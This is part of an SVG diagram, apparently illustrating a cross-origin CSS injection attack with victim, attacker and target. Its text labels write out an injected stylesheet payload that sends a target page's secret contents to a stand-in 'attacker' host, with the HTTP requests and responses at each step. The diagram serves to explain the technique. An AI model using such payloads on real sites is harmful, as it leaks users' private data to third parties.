-8.31787,-10e-4 -15.6074,-0.0134 -16.19894,-0.027 z m 44.99706,-2.91823 c -0.3328,-0.20557 -0.0607,-0.79677 0.28308,-0.6151 0.0737,0.0389 0.43029,0.0535 0.79246,0.0323 1.59896,-0.0934 2.93169,-0.12845 3.11657,-0.082 0.25065,0.0629 0.33814,0.27213 0.17994,0.43033 -0.0884,0.0884 -0.54592,0.13514 -1.73031,0.1767 -0.88555,0.0311 -1.80765,0.0781 -2.0491,0.10458 -0.25034,0.0274 -0.50502,0.007 -0.59264,-0.0468 z m -3.18272,-0.40273 c -0.42823,-0.0845 -1.16035,-0.11487 -2.41448,-0.10016 -0.98993,0.0116 -1.84927,-0.0108 -1.90963,-0.0497 -0.13615,-0.0878 -0.14371,-0.38025 -0.0119,-0.4617 0.20334,-0.12567 4.04611,-0.0421 4.95063,0.10769 0.95631,0.15835 1.20182,0.28159 1.01336,0.50869 -0.13962,0.16823 -0.76013,0.16638 -1.62795,-0.005 z m -42.88988,-0.64004 0,-0.3165 1.16333,-0.0439 c 1.38078,-0.0521 25.8205,-0.0464 29.01762,0.007 l 2.21693,0.0369 0,0.31446 0,0.31447 -2.26083,-0.043 c -3.31583,-0.0631 -27.32613,-0.0679 -28.84202,-0.006 l -1.29503,0.0531 0,-0.3165 z m 38.71942,-1.76519 c -0.14079,-0.26307 0.0186,-0.4765 0.49034,-0.65667 0.36186,-0.13819 0.49577,-0.14502 1.12358,-0.0573 0.39202,0.0548 1.23142,0.0995 1.86535,0.0995 0.91751,-9e-5 1.17488,0.0267 1.26188,0.13159 0.0835,0.10066 0.0852,0.16075 0.007,0.25497 -0.16113,0.19415 -1.96363,0.27626 -3.01368,0.13727 -0.83702,-0.11078 -0.86916,-0.10859 -1.11897,0.0761 -0.3201,0.23666 -0.49442,0.24079 -0.6155,0.0145 z m 7.14317,-0.4837 c -0.13211,-0.34428 0.0701,-0.43724 0.98832,-0.45451 0.47736,-0.009 1.4054,-0.0416 2.06232,-0.0724 1.02876,-0.0483 1.21394,-0.0366 1.33521,0.0847 0.1614,0.1614 0.11199,0.37311 -0.10129,0.43395 -0.08,0.0228 -1.06345,0.0688 -2.18535,0.10226 -1.8996,0.0566 -2.0439,0.0501 -2.09921,-0.094 z m -45.86259,-1.05278 0,-0.3073 16.19894,0 16.19894,0 0,0.3073 0,0.30729 -16.19894,0 -16.19894,0 0,-0.30729 z m 38.10662,-1.30846 c -0.17203,-0.0769 -0.22577,-0.21912 -0.18565,-0.49143 0.11374,-0.77202 0.21286,-1.87413 0.23294,-2.59007 0.026,-0.92792 0.14349,-2.10977 0.2967,-2.98517 0.14622,-0.83549 0.12059,-1.88751 -0.0506,-2.07667 -0.26761,-0.2957 -0.0276,-0.40991 0.96212,-0.4578 7.12824,-0.3449 12.45662,-0.51251 12.75663,-0.40126 0.10207,0.0378 0.20821,0.12777 0.23587,0.19984 0.0783,0.20411 0.0659,4.75556 -0.0177,6.47507 -0.0413,0.84931 -0.12028,1.62872 -0.17557,1.73202 -0.20848,0.38956 -0.3415,0.40633 -3.43286,0.43295 -1.6177,0.0139 -3.07955,0.0639 -3.24857,0.11099 -0.39425,0.10993 -7.13719,0.15705 -7.37333,0.0515 z m 7.10994,-0.6331 c 0.12072,-0.0284 1.42454,-0.0622 2.89737,-0.0751 2.19801,-0.0193 3.45301,-0.0782 3.52243,-0.16518 0.058,-0.0727 0.18417,-3.48754 0.19511,-5.28106 l 0.0139,-2.28278 -2.10718,0.0326 c -2.51852,0.039 -5.93433,0.15736 -7.98972,0.27692 -0.82092,0.0478 -1.73952,0.084 -2.04133,0.0805 l -0.54874,-0.006 0,0.74769 c 0,0.41123 -0.0416,0.94144 -0.0923,1.17825 -0.1253,0.58424 -0.24048,1.78534 -0.34266,3.57294 -0.0469,0.82092 -0.10246,1.61112 -0.12342,1.75598 l -0.0381,0.2634 3.2176,-0.0231 c 1.76968,-0.0127 3.31636,-0.0463 3.43709,-0.0747 z m -45.01902,-0.96916 c -0.15549,-0.0337 -0.19754,-0.10342 -0.19754,-0.32766 l 0,-0.28489 0.98774,0.0362 c 0.6566,0.024 1.31152,-0.0134 1.95353,-0.11153 0.834,-0.12754 1.71466,-0.14619 6.45394,-0.13668 4.68914,0.009 5.61587,-0.01 6.36544,-0.13193 0.72119,-0.1175 1.80677,-0.14864 6.10133,-0.17499 2.87323,-0.0176 6.41922,-0.045 7.87998,-0.0607 l 2.65592,-0.0286 0,0.31897 0,0.31896 -2.69982,0.016 c -13.01493,0.0773 -13.04447,0.0777 -13.89534,0.22467 -0.7157,0.12359 -1.61789,0.14281 -6.40822,0.13655 -3.6802,-0.005 -5.7543,0.0253 -6.10204,0.0886 -0.56931,0.10359 -2.77232,0.18696 -3.09492,0.11713 z m -0.19754,-4.46251 0,-0.30729 11.65533,-0.0378 c 6.41044,-0.0208 13.69009,-0.0508 16.177,-0.0668 l 4.52165,-0.029 0,0.3073 0,0.3073 -4.47775,0.0301 c -2.46277,0.0165 -9.74242,0.0466 -16.177,0.0668 l -11.69923,0.0367 0,-0.3073 z m 0.87799,-3.00983 c -0.81074,-0.0382 -0.87799,-0.0705 -0.87799,-0.42189 l 0,-0.3096 0.32924,0.0669 c 0.18109,0.0368 7.47254,0.0661 16.20322,0.0651 l 15.87397,-0.002 -0.0262,0.31203 -0.0262,0.31202 -15.49655,0 c -8.5231,0 -15.71385,-0.0102 -15.97944,-0.0228 z m 45.24638,-2.00167 c -0.0318,-0.0828 -0.0172,-0.21429 0.0325,-0.29223 0.099,-0.1555 0.37287,-0.17973 2.38633,-0.21116 1.03153,-0.0161 1.1873,2.6e-4 1.27159,0.13364 0.20892,0.33058 -0.0582,0.39524 -1.8985,0.45961 -1.59011,0.0556 -1.73894,0.0482 -1.7919,-0.0899 z m -7.3189,-0.20015 c -0.18644,-0.0627 -0.26585,-0.34875 -0.13353,-0.48107 0.10499,-0.10499 0.56549,-0.13034 2.58441,-0.14227 2.3375,-0.0138 2.46102,-0.006 2.54654,0.15344 0.0638,0.11917 0.059,0.20867 -0.0165,0.30819 -0.092,0.12128 -0.43008,0.1437 -2.49961,0.16578 -1.3163,0.014 -2.43291,0.0122 -2.48134,-0.004 z m -38.80547,-2.03119 0,-0.31823 1.11943,-0.0267 c 0.6157,-0.0147 7.90522,-0.0443 16.19895,-0.0657 l 15.0795,-0.039 0,0.30806 0,0.30806 -14.9039,0.0392 c -8.19715,0.0216 -15.48668,0.0557 -16.19895,0.0759 l -1.29503,0.0367 0,-0.31824 z m 47.41154,6.2e-4 c -0.12073,-0.0404 -0.36283,-0.0774 -0.53799,-0.0822 -0.37959,-0.0104 -0.59497,-0.21462 -0.45688,-0.43316 0.0717,-0.11352 0.19841,-0.14 0.5656,-0.1182 0.26024,0.0154 1.09225,0.0477 1.84889,0.0718 1.42346,0.0452 1.55322,0.0842 1.42171,0.42692 -0.041,0.10674 -0.24634,0.1317 -1.08377,0.1317 -0.56827,0 -1.14681,0.0172 -1.28564,0.0383 -0.13883,0.021 -0.3512,0.005 -0.47192,-0.0352 z m -9.30671,-0.39821 c -0.0857,-0.10325 -0.0863,-0.15936 -0.003,-0.25979 0.0876,-0.10556 0.57206,-0.13433 2.75448,-0.1636 1.45649,-0.0195 2.74177,-0.0508 2.85616,-0.0695 0.13297,-0.0217 0.24383,0.0235 0.3073,0.12521 0.0815,0.13054 0.062,0.18972 -0.10797,0.32924 -0.19524,0.16022 -0.36673,0.1701 -2.95248,0.1701 -2.33306,0 -2.7616,-0.0198 -2.8545,-0.1317 z m 7.90192,-2.54717 c -0.76889,-0.10581 -3.53576,-0.31984 -5.6776,-0.43919 -1.01723,-0.0567 -2.02819,-0.30458 -2.20551,-0.54081 -0.0847,-0.11284 -0.10255,-0.27753 -0.0602,-0.55549 0.12367,-0.81184 0.16128,-1.87469 0.16158,-4.56564 0,-2.47274 -0.0158,-2.79029 -0.15136,-2.99723 -0.13952,-0.21294 -0.14033,-0.24281 -0.0101,-0.37306 0.12119,-0.12118 0.40501,-0.14159 1.9694,-0.14159 1.29182,0 2.04034,-0.0403 2.55257,-0.13749 0.60376,-0.11453 1.35663,-0.13285 4.50941,-0.10974 l 3.78464,0.0277 0.50535,0.24815 c 0.27793,0.13648 0.53951,0.31427 0.58126,0.3951 0.13707,0.26526 0.18106,1.32801 0.20227,4.88528 l 0.0209,3.50915 -0.2598,0.15135 c -0.55467,0.32314 -1.96158,0.60689 -3.42056,0.68988 -1.65216,0.094 -1.45574,0.0976 -2.50228,-0.0464 z m 3.68756,-0.63956 c 0.2656,-0.0511 0.79542,-0.17486 1.17739,-0.27495 0.38197,-0.10009 0.7024,-0.18198 0.71207,-0.18198 0.0507,0 -0.0309,-7.12193 -0.085,-7.42465 -0.0771,-0.43158 -0.27057,-0.57158 -0.92644,-0.6706 -0.72193,-0.10899 -7.42751,-0.0781 -7.90193,0.0363 -0.2173,0.0524 -1.19869,0.11151 -2.18086,0.13125 l -1.78576,0.0359 0.0579,0.49976 c 0.10917,0.94294 0.14979,4.87373 0.0551,5.32871 -0.0503,0.24144 -0.10833,0.75912 -0.12904,1.15038 l -0.0376,0.71138 0.42858,0.0989 c 0.54855,0.12662 1.92737,0.24723 4.25029,0.37177 1.01408,0.0544 2.19936,0.15142 2.63397,0.21567 0.89039,0.13163 2.98406,0.11596 3.73146,-0.0279 z m -49.69431,-0.26935 0,-0.36318 0.89994,-0.008 c 3.09663,-0.0263 8.72992,-0.17687 9.28476,-0.24812 0.36217,-0.0465 2.49175,-0.087 4.73239,-0.09 3.29949,-0.004 4.20074,-0.0311 4.74116,-0.14031 0.56956,-0.11513 1.38064,-0.12836 5.5401,-0.0903 2.68007,0.0245 5.39636,0.0676 6.03619,0.0959 l 1.16334,0.0513 0,0.315 0,0.31499 -1.99743,-0.0559 c -1.09858,-0.0308 -3.89389,-0.0619 -6.21179,-0.0693 -3.68434,-0.0117 -4.30269,0.006 -4.91675,0.13728 -0.61737,0.13243 -1.21251,0.14807 -4.91675,0.12922 -3.44812,-0.0176 -4.41391,0.004 -5.31185,0.1194 -0.81402,0.10447 -1.89122,0.1422 -4.17046,0.14609 -1.69013,0.003 -3.47795,0.0308 -3.97291,0.062 l -0.89994,0.0568 0,-0.36318 z m 0,-3.91905 0,-0.30729 11.56753,-0.005 c 6.43145,-0.003 11.76246,-0.0403 12.00654,-0.0841 0.24145,-0.0434 2.25644,-0.10569 4.47775,-0.13843 2.22132,-0.0327 4.11031,-0.0963 4.19775,-0.14131 0.1432,-0.0737 0.15628,-0.0441 0.1317,0.29731 l -0.0273,0.37909 -2.89737,0.0587 c -1.59355,0.0323 -3.70732,0.0975 -4.69725,0.14489 -0.98994,0.0474 -6.96577,0.0901 -13.27963,0.095 l -11.47973,0.009 0,-0.3073 z m 0,-3.63308 0,-0.34396 0.59264,-0.051 c 0.32595,-0.0281 1.71867,-0.075 3.09492,-0.10421 1.43937,-0.0306 2.83793,-0.10578 3.29247,-0.17701 0.46616,-0.0731 1.44724,-0.12399 2.39249,-0.1242 1.02949,-2.6e-4 1.87694,-0.0477 2.37057,-0.13291 0.66176,-0.11417 2.0161,-0.12713 9.7677,-0.0935 4.94968,0.0215 9.42414,0.0639 9.94325,0.0943 l 0.94384,0.0552 0,0.29235 0,0.29235 -0.72434,0.0359 c -0.39839,0.0197 -0.85836,0.007 -1.02216,-0.0282 -0.1638,-0.0352 -4.41109,-0.0708 -9.43841,-0.079 -6.94048,-0.0114 -9.25682,0.0109 -9.62349,0.0926 -0.29713,0.0662 -1.05753,0.10134 -1.97667,0.0913 -1.05028,-0.0114 -1.76713,0.0278 -2.41448,0.13204 -0.50638,0.0816 -1.27628,0.15656 -1.71089,0.16664 -2.51334,0.0584 -5.1188,0.1492 -5.2899,0.18447 -0.17817,0.0367 -0.19754,0.007 -0.19754,-0.30324 z"
       id="path3009"
       style="fill:#000000" />
    <path
       d="m 519.60062,777.36218 397,0"
       id="path11"
       style="stroke:#000000;stroke-width:2;marker-end:url(#Arrow2Lend)" />
    <path
       d="m 916.60062,787.36218 -397,0"
       id="path13"
       style="stroke:#000000;stroke-width:2;marker-end:url(#Arrow2Lend)" />
    <path
       d="m 509.60062,877.36218 -390,0"
       id="path15"
       style="stroke:#000000;stroke-width:2;marker-end:url(#Arrow2Lend)" />
    <path
       d="m 119.60062,887.36218 390,0"
       id="path17"
       style="stroke:#000000;stroke-width:2;marker-end:url(#Arrow2Lend)" />
    <path
       d="m 519.60062,951.36218 397,0"
       id="path23"
       style="stroke:#000000;stroke-width:2;marker-end:url(#Arrow2Lend)" />
    <path
       d="m 916.60062,961.36218 -397,0"
       id="path25"
       style="stroke:#000000;stroke-width:2;marker-end:url(#Arrow2Lend)" />
    <path
       d="m 509.60062,1021.3622 -390,0"
       id="path19"
       style="stroke:#000000;stroke-width:2;marker-end:url(#Arrow2Lend)" />
    <path
       d="m 119.60062,1031.3622 390,0"
       id="path21"
       style="stroke:#000000;stroke-width:2;marker-end:url(#Arrow2Lend)" />
    <path
       d="m 509.50925,762.36218 5,0 5,0 0,64.49851 12.09137,6.25 -25,12.5 12.90863,6.25 0,200.50151 -10,0 0,-200.50151 -12.90863,-6.25 25,-12.5 -12.09137,-6.25 0,-64.49851 z"
       id="path27"
       style="fill:#808080" />
    <path
       d="m 109.60062,762.36218 5,0 5,0 0,64.49851 12.09137,6.25 -25,12.5 12.90863,6.25 0,200.50151 -10,0 0,-200.50151 -12.90863,-6.25 25,-12.5 -12.09137,-6.25 0,-64.49851 z"
       id="path29"
       style="fill:#808080" />
    <path
       d="m 916.60062,762.36218 5,0 5,0 0,64.49851 12.09137,6.25 -25,12.5 12.90863,6.25 0,200.50151 -10,0 0,-200.50151 -12.90863,-6.25 25,-12.5 -12.09137,-6.25 0,-64.49851 z"
       id="path31"
       style="fill:#808080" />
    <circle
       cx="522"
       cy="91.000031"
       r="11"
       transform="translate(40.468516,678.36218)"
       id="circle33"
       style="fill:#ffffff;stroke:#000000;stroke-width:2"
       d="m 533,91.000031 c 0,6.075132 -4.92487,10.999999 -11,10.999999 -6.07513,0 -11,-4.924867 -11,-10.999999 0,-6.075133 4.92487,-11 11,-11 6.07513,0 11,4.924867 11,11 z" />
    <circle
       cx="522"
       cy="91.000031"
       r="11"
       transform="translate(-51.081484,778.27218)"
       id="circle35"
       style="fill:#ffffff;stroke:#000000;stroke-width:2"
       d="m 533,91.000031 c 0,6.075132 -4.92487,10.999999 -11,10.999999 -6.07513,0 -11,-4.924867 -11,-10.999999 0,-6.075133 4.92487,-11 11,-11 6.07513,0 11,4.924867 11,11 z" />
    <circle
       cx="522"
       cy="91.000031"
       r="11"
       transform="translate(32.848516,851.50218)"
       id="circle37"
       style="fill:#ffffff;stroke:#000000;stroke-width:2"
       d="m 533,91.000031 c 0,6.075132 -4.92487,10.999999 -11,10.999999 -6.07513,0 -11,-4.924867 -11,-10.999999 0,-6.075133 4.92487,-11 11,-11 6.07513,0 11,4.924867 11,11 z" />
    <circle
       cx="522"
       cy="91.000031"
       r="11"
       transform="translate(-46.051484,921.27218)"
       id="circle39"
       style="fill:#ffffff;stroke:#000000;stroke-width:2"
       d="m 533,91.000031 c 0,6.075132 -4.92487,10.999999 -11,10.999999 -6.07513,0 -11,-4.924867 -11,-10.999999 0,-6.075133 4.92487,-11 11,-11 6.07513,0 11,4.924867 11,11 z" />
    <text
       x="314.24985"
       y="871.36218"
       id="text41"
       style="font-size:12px;text-align:center;text-anchor:middle;font-family:Courier">GET /hampsterdance</text>
    <text
       id="text43"
       style="font-size:12px;text-align:center;text-anchor:middle;font-family:Courier">
      <tspan
         x="314.09183"
         y="895.36218"
         id="tspan45">...</tspan>
      <tspan
         x="314.09183"
         y="910.36218"
         id="tspan47">&lt;link rel=&quot;stylesheet&quot;</tspan>
      <tspan
         x="314.09183"
         y="925.36218"
         id="tspan49">href=&quot;http://target/privatepage?</tspan>
      <tspan
         x="314.09183"
         y="940.36218"
         id="tspan51">q1={}body{background:</tspan>
      <tspan
         x="314.09183"
         y="955.36218"
         id="tspan53">url(http://attacker/%3F&amp;q2=)}&quot;&gt;</tspan>
      <tspan
         x="314.09183"
         y="970.36218"
         id="tspan55">...</tspan>
    </text>
    <text
       x="313.78128"
       y="1015.3622"
       id="text57"
       style="font-size:12px;text-align:center;text-anchor:middle;font-family:Courier">GET /?<tspan
   id="tspan59"
   style="font-style:italic">SECRET_INFORMATION</tspan>
</text>
    <text
       x="314.25589"
       y="1046.3622"
       id="text61"
       style="font-size:12px;text-align:center;text-anchor:middle;font-family:Courier">HTTP/1.1 204 Owned</text>
    <text
       x="726.24988"
       y="769.36218"
       id="text63"
       style="font-size:12px;text-align:center;text-anchor:middle;font-family:Courier">POST /login</text>
    <text
       id="text65"
       style="font-size:12px;text-align:center;text-anchor:middle;font-family:Courier">
      <tspan
         x="726.24988"
         y="801.36218"
         id="tspan67">HTTP/1.1 200 OK</tspan>
      <tspan
         x="726.24988"
         y="816.36218"
         id="tspan69">Set-Cookie: SID=2DK3P9YOX5</tspan>
      <tspan
         x="726.24988"
         y="831.36218"
         id="tspan71">...</tspan>
    </text>
    <text
       id="text73"
       style="font-size:12px;text-align:center;text-anchor:middle;font-family:Courier">
      <tspan
         x="720.19324"
         y="915.14154"
         id="tspan75">GET /privatepage?q1=<tspan
   id="tspan77"
   style="font-weight:bold">{}body{background:</tspan>
</tspan>
      <tspan
         x="720.19324"
         y="930.81274"
         id="tspan79"><tspan
   id="tspan81"
   style="font-weight:bold">url(http://attacker/%3F</tspan>

&amp;q2=<tspan
   id="tspan83"
   style="font-weight:bold">)}</tspan>
</tspan>
      <tspan
         x="720.19324"
         y="945.85913"
         id="tspan85">Cookie: SID=2DK3P9YOX5</tspan>
    </text>
    <text
       id="text87"
       style="font-size:12px;text-align:center;text-anchor:middle;font-family:Courier">
      <tspan
         x="719.2179"
         y="976.12683"
         id="tspan89">Content-Type: text/html</tspan>
      <tspan
         x="719.2179"
         y="991.12323"
         id="tspan91">&lt;!doctype html&gt;&lt;html&gt;...</tspan>
      <tspan
         x="719.2179"
         y="1006.7444"
         id="tspan93"
         style="font-weight:bold">{}body{background:</tspan>
      <tspan
         x="719.2179"
         y="1021.7408"
         id="tspan95">
        <tspan
           id="tspan97"
           style="font-weight:bold">url(http://attacker/?</tspan>
        <tspan
           id="tspan99"
           style="font-style:italic">SECRET_INFORMATION</tspan>
        <tspan
           id="tspan101"
           style="font-weight:bold">)}</tspan>
      </tspan>
      <tspan
         x="719.2179"
         y="1037.3745"
         id="tspan103">...&lt;/html&gt;</tspan>
    </text>
    <text
       x="557.07782"
       y="776.45221"
       id="text105"
       style="font-size:20px;font-family:Helvetica">1</text>
    <text
       x="465.46851"
       y="876.36218"
       id="text107"
       style="font-size:20px;font-family:Helvetica">2</text>
    <text
       x="549.46851"
       y="949.36218"
       id="text109"
       style="font-size:20px;font-family:Helvetica">3</text>
    <text
       x="470.46851"
       y="1019.3622"
       id="text111"
       style="font-size:20px;font-family:Helvetica">4</text>
    <text
       x="515.42908"
       y="757.90216"
       id="text113"
       style="font-size:20px;text-align:center;text-anchor:middle;font-family:Helvetica">Victim</text>
    <text
       x="114.15183"
       y="755.90216"
       id="text115"
       style="font-size:20px;text-align:center;text-anchor:middle;font-family:Helvetica">Attacker</text>
    <text
       x="921.62408"
       y="756.0022"
       id="text117"
       style="font-size:20px;text-align:center;text-anchor:middle;font-family:Helvetica">Target</text>
    <text
       x="893.77771"
       y="673.86163"
       id="text3011"
       xml:space="preserve"
       style="font-size:8px;font-style:normal;font-variant:normal;font-weight:bold;font-stretch:normal;text-align:start;text-anchor:start;fill:#000000;fill-opacity:1;stroke:none;font-family:Century Schoolbook L;-inkscape-font-specification:Century Schoolbook L Medium"><tspan
         x="893.77771"
         y="673.86163"
         id="tspan3013">Clockworks!</tspan></text>
  </g>
</svg>
